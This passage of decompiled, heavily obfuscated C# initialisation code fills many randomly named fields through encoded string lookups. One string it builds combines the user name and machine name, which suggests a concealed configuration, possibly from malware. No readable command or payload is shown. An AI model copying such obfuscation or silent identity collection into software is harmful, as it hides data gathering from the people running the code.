			ZszvXPTYjBtgjF(getString_0(107106263)),
			ZszvXPTYjBtgjF(getString_0(107106230)),
			ZszvXPTYjBtgjF(getString_0(107106217)),
			ZszvXPTYjBtgjF(getString_0(107105624)),
			ZszvXPTYjBtgjF(getString_0(107105591)),
			ZszvXPTYjBtgjF(getString_0(107105574)),
			ZszvXPTYjBtgjF(getString_0(107105497)),
			ZszvXPTYjBtgjF(getString_0(107105464)),
			ZszvXPTYjBtgjF(getString_0(107105431)),
			ZszvXPTYjBtgjF(getString_0(107105398)),
			ZszvXPTYjBtgjF(getString_0(107105877)),
			ZszvXPTYjBtgjF(getString_0(107105844)),
			ZszvXPTYjBtgjF(getString_0(107105835)),
			ZszvXPTYjBtgjF(getString_0(107105794)),
			ZszvXPTYjBtgjF(getString_0(107105717)),
			ZszvXPTYjBtgjF(getString_0(107105684)),
			ZszvXPTYjBtgjF(getString_0(107105675)),
			ZszvXPTYjBtgjF(getString_0(107105130)),
			ZszvXPTYjBtgjF(getString_0(107105089)),
			ZszvXPTYjBtgjF(getString_0(107105016)),
			ZszvXPTYjBtgjF(getString_0(107104983)),
			ZszvXPTYjBtgjF(getString_0(107104974)),
			ZszvXPTYjBtgjF(getString_0(107104941)),
			ZszvXPTYjBtgjF(getString_0(107106263)),
			ZszvXPTYjBtgjF(getString_0(107104900)),
			ZszvXPTYjBtgjF(getString_0(107105339)),
			ZszvXPTYjBtgjF(getString_0(107105326)),
			ZszvXPTYjBtgjF(getString_0(107105293)),
			ZszvXPTYjBtgjF(getString_0(107105252)),
			ZszvXPTYjBtgjF(getString_0(107105179)),
			ZszvXPTYjBtgjF(getString_0(107105146)),
			ZszvXPTYjBtgjF(getString_0(107104593)),
			ZszvXPTYjBtgjF(getString_0(107104584)),
			ZszvXPTYjBtgjF(getString_0(107106230)),
			ZszvXPTYjBtgjF(getString_0(107104543)),
			ZszvXPTYjBtgjF(getString_0(107106217)),
			ZszvXPTYjBtgjF(getString_0(107104478)),
			ZszvXPTYjBtgjF(getString_0(107104445)),
			ZszvXPTYjBtgjF(getString_0(107104404)),
			ZszvXPTYjBtgjF(getString_0(107104371)),
			ZszvXPTYjBtgjF(getString_0(107104874)),
			ZszvXPTYjBtgjF(getString_0(107104833)),
			ZszvXPTYjBtgjF(getString_0(107104800)),
			ZszvXPTYjBtgjF(getString_0(107104767)),
			ZszvXPTYjBtgjF(getString_0(107104694)),
			ZszvXPTYjBtgjF(getString_0(107104685)),
			ZszvXPTYjBtgjF(getString_0(107104644))
		};
		tUzzZAFebr = new List<string>
		{
			ZszvXPTYjBtgjF(DqooNRqZwbOam(getString_0(107104059))),
			ZszvXPTYjBtgjF(getString_0(107104042)),
			ZszvXPTYjBtgjF(getString_0(107103949)),
			ZszvXPTYjBtgjF(getString_0(107104364)),
			ZszvXPTYjBtgjF(getString_0(107104239)),
			ZszvXPTYjBtgjF(getString_0(107104174)),
			ZszvXPTYjBtgjF(getString_0(107103537)),
			ZszvXPTYjBtgjF(getString_0(107103440)),
			ZszvXPTYjBtgjF(getString_0(107103347)),
			ZszvXPTYjBtgjF(getString_0(107103762)),
			ZszvXPTYjBtgjF(getString_0(107103669)),
			ZszvXPTYjBtgjF(getString_0(107103060)),
			ZszvXPTYjBtgjF(getString_0(107102967)),
			ZszvXPTYjBtgjF(DqooNRqZwbOam(getString_0(107104059)))
		};
		UGGmKsnoSN = ZszvXPTYjBtgjF(getString_0(107102870));
		ZOubOFvdOxx = new List<string>
		{
			ZszvXPTYjBtgjF(getString_0(107103301)),
			ZszvXPTYjBtgjF(getString_0(107103107)),
			ZszvXPTYjBtgjF(getString_0(107102401)),
			ZszvXPTYjBtgjF(getString_0(107102719)),
			ZszvXPTYjBtgjF(getString_0(107200285)),
			ZszvXPTYjBtgjF(getString_0(107200603))
		};
		nhZDyaCRzSAZ = new List<string>
		{
			ZszvXPTYjBtgjF(getString_0(107200409)),
			ZszvXPTYjBtgjF(getString_0(107199836)),
			ZszvXPTYjBtgjF(getString_0(107199807))
		};
		VrRnASDdgrSS = getString_0(107396882);
		qONUKLrZXBKbdHH = getString_0(107396882);
		WTgMoRUfuQyd = new DateTime(2000, 1, 1);
		cUsnkANVnGStpU = new DateTime(2100, 1, 1);
		mDoYpgRrDTVMHT = getString_0(107396909);
		lpATBSWKaW = getString_0(107117137);
		veSFSgAcXbYkfk = getString_0(107396882);
		TrfqnNPkKnxh = getString_0(107396882);
		HabWjBzXNZORcRD = getString_0(107396882);
		dRgBPstszwZYX = getString_0(107396909);
		GDLKdqRcwWU = getString_0(107396882);
		pAvlEUMGUOUVcdb = getString_0(107396882);
		RrzUCivKfrsaJ = new List<string>
		{
			getString_0(107391626),
			getString_0(107385139),
			getString_0(107412518),
			getString_0(107392645)
		};
		ARdYTzaLyCQej = getString_0(107396882);
		zxDCvygXmLZs = getString_0(107396501);
		XSVbAbpxycYPjy = getString_0(107396882);
		TxXiGDwYtdTBy = getString_0(107396882);
		pHmzsZHyCjr = getString_0(107396882);
		dZCepYtuPbx = string.Empty;
		bnwHpViNjnY = getString_0(107396882);
		wHIUGaHkbqZ = getString_0(107396909);
		NAuVcBiAFcWa = getString_0(107396909);
		NwYxCJSnEoN = getString_0(107088579);
		DfnXcorpnTcs = getString_0(107411294);
		VNwrzrCLJckBBg = getString_0(107396882);
		lqHDJpzUbIpmbQ = getString_0(107396909);
		seHvuluwnSdiPD = getString_0(107396882);
		FwhevPebYUTFN = getString_0(107396882);
		aMfKePxyxiok = getString_0(107396882);
		uUjbLARyBBdnV = getString_0(107088796);
		KRthpTyCiYU = getString_0(107396882);
		szncKbDkEgMPP = getString_0(107396882);
		kkipsSsrGYdH = getString_0(107199746);
		kMYmdrxKBXb = getString_0(107396882);
		VXrvhMAQaPAdjT = getString_0(107396882);
		CtBsjNEdQzWTtB = getString_0(107396909);
		XTLwWuXHos = getString_0(107396882);
		JsiIpuaiIxQx = getString_0(107199725);
		UHVSEIkpYf = getString_0(107396909);
		POQJbfIxsobkq = getString_0(107396909);
		sCuSkFLTfcaWr = getString_0(107396882);
		quhmMiARDLmR = getString_0(107396882);
		YFhYUCNshEdDAX = new string[0];
		uneEoMuaKwN = getString_0(107396909);
		qZXDIsTpDUXR = true;
		EZZKZrHTpoTaL = getString_0(107396909);
		kzxgomJEqSw = true;
		AxeGoYXMvgRYQ = false;
		piVlfEbIoCs = false;
		gDuYPqPgoKOgrz = false;
		YPtXSOBdFjEyjx = getString_0(107199712);
		WUCUbinjeq = false;
		hrTgKngwQHtz = false;
		tHfxQsYaegO = false;
		gEajYrRefTMmPd = false;
		tJrulPsPKZ = true;
		wtdIqahxTNLZTaxN = getString_0(107199691) + Environment.UserName + getString_0(107199646) + Environment.MachineName + getString_0(107199657) + GtRYKNkRmbf.iFtjToyyGJbdg() + getString_0(107199652);
		IZQwtTCtfut = false;
		DJgfUdbWObEcK = new Stopwatch();
		uKBVRzIpOhGoBvvo = 0;
		jTlplcaVkMbxzj = 0;
		SWTAoziGpJs = false;
		oADcMioEnFbvkP = getString_0(107199611) + GtRYKNkRmbf.iFtjToyyGJbdg() + getString_0(107199602);
		YCdnHJwvmqrsRsZ = new List<string>();
		MjWiSZYWGb = new List<string>();
		vASGoBEUZmAI = new List<string>();
	}
}
